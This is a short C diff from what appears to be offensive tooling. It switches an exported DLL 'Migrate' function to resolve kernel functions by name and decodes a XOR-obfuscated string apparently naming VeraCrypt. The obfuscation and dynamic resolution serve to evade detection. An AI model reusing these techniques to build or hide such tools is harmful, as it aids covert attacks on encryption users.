@@ -51,7 +51,7 @@ __declspec(dllexport) void Migrate()
         goto shutdown;
     }
 
-    PopulateKernelFunctionPtrsByOrdinal(hKernel);
+    PopulateKernelFunctionPtrsByName(hKernel);
 
     char cVeraCrypt[] = {0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0};
     MyXor(cVeraCrypt, 13, key, 5);
